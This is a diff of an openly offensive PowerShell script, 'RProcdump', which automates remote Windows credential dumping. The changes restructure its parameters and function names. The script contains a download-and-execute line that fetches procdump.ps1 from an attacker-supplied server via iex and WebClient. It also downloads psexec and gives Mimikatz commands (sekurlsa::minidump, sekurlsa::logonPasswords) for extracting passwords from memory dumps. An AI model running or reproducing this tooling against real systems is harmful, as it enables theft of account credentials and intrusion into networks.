@@ -9,19 +9,21 @@ Help:
  Author: @ThebenyGreen
   - EyesOpenSecurity
 #>
-Write-Host "RProcdump - @TheBenyGreen" -ForegroundColor DarkGreen;
-Write-Host "Remote Windows credentials dump process automation. "
-Write-Host "----------------------------------------------------"
-
-Function RProcdump {
-	[CmdletBinding()] param( 
+param( 
 	[string] $server ,
 	[string] $login ,
 	[string] $pass 
 	)
+Write-Host "RProcdump - @TheBenyGreen" -ForegroundColor DarkGreen;
+Write-Host "Remote Windows credentials dump process automation. "
+Write-Host "----------------------------------------------------"
+
+
+	
 #	[string] $server = "http://127.0.0.1"
 #	[string] $login = "administrator"
 #	[string] $pass =  "password123"
+	
 	Function PsexecDownload {
 			$exists = "$env:userprofile\psexec.exe"
 			If (Test-Path $exists){
@@ -37,7 +39,7 @@ Function RProcdump {
 			Rename-Item $FileOnDisk psexec.exe
 			}
 		}
-	Function PsexecCommand { 
+	Function RProcdump { 
 		[CmdletBinding()] param( 
 		[string]$id
 		)
@@ -62,12 +64,13 @@ iex((New-Object Net.WebClient).DownloadString("$server/procdump.ps1"))
 			}	
 		}
 	}
-PsexecCommand
+
+RProcdump $server $login $pass
 
 Write-Host "If Dumps have been uploaded"
 Write-Host "You can it manually : Open dump file with Mimikatz to retrieve the creds ->  mimikatz # sekurlsa::minidump HOSTNAME.dmp  AND >mimikatz # sekurlsa::logonPasswords "
 Write-Host "OR you can try it automately"
-$a = Read-Host "Do you want to try it automately ? (o/y):"
+$a = Read-Host "Do you want to try it automately ? (y/n):"
 if ($a -eq "y") {
 	$dump = Read-Host "URL of zipped dump file to download (PC.zip) :"
 	$URL = "$server/$dump"
@@ -80,4 +83,4 @@ else {
 	Write-Host "Ok, you will do it manually with -> mimikatz # sekurlsa::minidump HOSTNAME.dmp  AND >mimikatz # sekurlsa::logonPasswords "
 	Write-Host "Download Mimikatz: https://github.com/gentilkiwi/mimikatz/releases"
 	}
-}
+
